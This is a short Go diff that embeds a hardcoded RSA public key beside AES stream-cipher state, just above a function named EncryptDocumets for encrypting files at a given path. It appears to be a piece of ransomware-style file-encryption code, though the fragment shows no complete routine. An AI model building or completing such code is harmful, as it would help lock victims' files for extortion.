@@ -31,6 +31,13 @@ var block cipher.Block
 var iv [aes.BlockSize]byte
 var stream cipher.Stream
 
+var pubKey = `-----BEGIN PUBLIC KEY-----
+MIGgMA0GCSqGSIb3DQEBAQUAA4GOADCBigKBgQDQIHdNPClJAZVUb9AiPk/A7dAP
+V2+6HLiw1pZyEZel+Pr0Z53uakh0BD1mNzZzfCr3AyCGqhxveyg5SItX8Ce8DQhN
+Kl9TBjPjNjAKb4XF2kKZepMjOM2sgLsdAotYAZcUiczssmgxkHaUpoYtTs6YJadE
+ypklH1uu6oM6xiVK/wIEDhO6Xw==
+-----END PUBLIC KEY-----`
+
 func EncryptDocumets(path string, mode bool) {
 	if mode {
 		//Encrypt
